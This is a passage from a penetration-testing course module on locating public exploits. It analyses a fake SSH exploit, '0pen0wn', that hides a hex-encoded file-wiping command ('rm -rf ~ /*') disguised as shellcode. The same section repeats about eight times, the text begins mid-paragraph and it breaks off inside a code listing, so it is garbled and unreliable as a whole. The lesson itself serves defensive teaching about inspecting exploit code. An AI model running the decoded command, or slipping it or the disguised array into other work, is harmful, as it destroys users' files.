This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
